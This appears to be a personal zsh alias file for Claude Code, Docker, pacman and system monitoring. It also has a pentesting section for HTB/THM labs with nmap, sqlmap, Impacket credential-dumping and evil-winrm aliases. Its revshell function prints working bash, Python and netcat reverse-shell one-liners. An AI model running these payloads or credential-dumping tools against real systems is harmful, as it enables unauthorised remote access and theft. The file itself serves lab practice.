# Claude Code & Dev Workflow Aliases
# Sourced from: ~/.config/claude/aliases.zsh

# ============================================
# Claude Code
# ============================================
alias clc='claude'
alias clr='claude --resume'               # Resume last session
alias clp='claude --print'                # One-shot, no interactive
alias cla='claude "$(wl-paste)"'          # Send clipboard to Claude

# ============================================
# Web Search (open in browser)
# ============================================
alias s='searxng-search'

_browser_search() {
    local url="$1"; shift
    local query=$(echo -n "$*" | jq -sRr @uri)
    firefox-developer-edition "${url}${query}" &>/dev/null &
}

ddg()  { _browser_search "https://duckduckgo.com/?q=" "$@"; }
ghs()  { _browser_search "https://github.com/search?q=" "$@"; }
so()   { _browser_search "https://stackoverflow.com/search?q=" "$@"; }
aw()   { _browser_search "https://wiki.archlinux.org/index.php?search=" "$@"; }
w()    { _browser_search "https://es.wikipedia.org/wiki/Special:Search?search=" "$@"; }
cve()  { _browser_search "https://www.exploit-db.com/search?q=" "$@"; }

# ============================================
# SearXNG Control
# ============================================
alias xs='systemctl --user start searxng.service'
alias xstop='systemctl --user stop searxng.service'
alias xr='systemctl --user restart searxng.service'
alias xstat='systemctl --user status searxng.service'
alias xl='docker logs -f searxng'

# ============================================
# Docker
# ============================================
alias d='docker'
alias dc='docker compose'
alias dps='docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"'
alias dlog='docker logs -f'
alias dex='docker exec -it'
alias dprune='docker system prune -af --volumes'

# ============================================
# System Monitoring
# ============================================
alias cpu='ps aux --sort=-%cpu | head -11'
alias mem='ps aux --sort=-%mem | head -11'
alias listening='ss -tulpn | grep LISTEN'  # ss > netstat
alias ports='ss -tulpn'
alias disk='command df -h -x tmpfs -x devtmpfs'
alias io='iostat -xz 1 3 2>/dev/null || echo "Install sysstat: pacman -S sysstat"'

# ============================================
# Pacman / AUR
# ============================================
alias pacs='pacman -Ss'                    # Search repos
alias paci='sudo pacman -S'               # Install
alias pacr='sudo pacman -Rns'             # Remove with deps
alias pacu='sudo pacman -Syu'             # Full upgrade
alias pacq='pacman -Qs'                   # Search installed
alias pacinfo='pacman -Qi'                # Package info
alias pacfiles='pacman -Ql'               # List package files
alias pacown='pacman -Qo'                 # Who owns this file?
alias pacorphans='pacman -Qdt'            # Orphaned packages
alias pacclean='sudo pacman -Sc'          # Clean cache

# ============================================
# Security & Hacking (ethical only)
# ============================================

# --- Variables ---
export WORDLISTS="/usr/share/seclists"
export TARGET=""
export LHOST=""
export LPORT="4444"

# --- Target management ---
settarget() { export TARGET="$1"; echo "[*] Target → $TARGET"; }
setlhost()  { export LHOST="$1";  echo "[*] LHOST  → $LHOST";  }
myhtbip()   {
    ip -br addr show tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1 \
        || echo "[!] tun0 no activo"
}

# --- VPN labs (HTB/THM) — distinto a ProtonVPN ---
alias htbvpn='sudo openvpn --config ~/vpn/htb.ovpn --daemon'
alias thmvpn='sudo openvpn --config ~/vpn/thm.ovpn --daemon'
alias vpnkill='sudo pkill openvpn'
alias tun0='ip -br addr show tun0 2>/dev/null | awk "{print \$3}" | cut -d/ -f1'

# --- Reconocimiento ---
alias nmapq='nmap -sV -sC -oN scan.txt'
alias nmapf='nmap -p- -T4 -oN fullscan.txt'
alias nmapU='nmap -sU --top-ports 200 -oN udp.txt'

# --- Web enumeration ---
alias fuzz='ffuf -w $WORDLISTS/Discovery/Web-Content/common.txt -u'
alias fuzzdir='ffuf -w $WORDLISTS/Discovery/Web-Content/directory-list-2.3-medium.txt -u'
alias ferox='feroxbuster --url'
alias nikscan='nikto -h'
alias sqli='sqlmap -u'

# --- Cracking ---
alias jtr='john --wordlist=$WORDLISTS/Passwords/Leaked-Databases/rockyou.txt'
alias hcat='hashcat -a 0 -w 3'

# --- SMB / AD ---
alias smb='smbclient'
alias smblist='smbclient -L'
alias enum4='enum4linux -a'

# --- Impacket ---
alias secretsdump='impacket-secretsdump'
alias psexec='impacket-psexec'
alias wmiexec='impacket-wmiexec'
alias smbexec='impacket-smbexec'
alias evilwinrm='evil-winrm -i'

# --- Listeners / Tunneling ---
alias ncl='nc -lvnp $LPORT'
alias chiselserver='chisel server -p 8888 --reverse'
alias chiselclient='chisel client'
alias proxy='proxychains -q'

# --- Misc ---
alias vol='volatility3'
alias binwalk='binwalk -e'

revshell() {
    local ip="${1:-127.0.0.1}" port="${2:-4444}"
    echo "Bash:   bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "Python: python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
    echo "NC:     nc -e /bin/sh $ip $port"
    echo "NC alt: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
}

# ============================================
# ProtonVPN
# ============================================
alias vpnc='protonvpn connect'
alias vpnd='protonvpn disconnect'
alias vpni='protonvpn info'

# ============================================
# Quick Utils
# ============================================
alias j='jq .'                             # Pretty print JSON
alias b64='base64'                         # Encode base64
alias b64d='base64 -d'                     # Decode base64
alias serve='python -m http.server 8000'   # HTTP server
alias myip='curl -s ifconfig.me'           # Public IP
alias weather='curl -s wttr.in/?format=3'  # Quick weather
alias epoch='date +%s'                     # Unix timestamp
alias path='echo $PATH | tr ":" "\n"'      # Pretty print PATH
alias sizeof='command du -sh'              # Size of dir/file

# Clipboard helpers (Wayland)
alias clip='wl-copy'
alias paste='wl-paste'

# Quick file sharing (temp URLs)
transfer() {
    if [ $# -eq 0 ]; then echo "Usage: transfer <file>"; return 1; fi
    curl --progress-bar --upload-file "$1" "https://transfer.sh/$(basename "$1")" | tee /dev/null
    echo
}
